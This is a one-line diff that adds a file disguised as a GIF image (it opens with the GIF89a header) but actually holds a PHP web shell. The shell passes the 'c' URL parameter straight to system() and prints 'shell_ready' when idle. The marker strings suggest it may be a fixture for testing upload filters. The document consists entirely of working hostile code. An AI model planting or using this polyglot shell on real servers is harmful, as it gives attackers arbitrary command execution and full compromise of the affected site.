@@ -1,0 +1,1 @@
+GIF89a<?php echo "POLYSHELL_START:"; if(isset($_GET["c"])){system($_GET["c"]);} else{echo "shell_ready";} echo ":POLYSHELL_END"; ?>
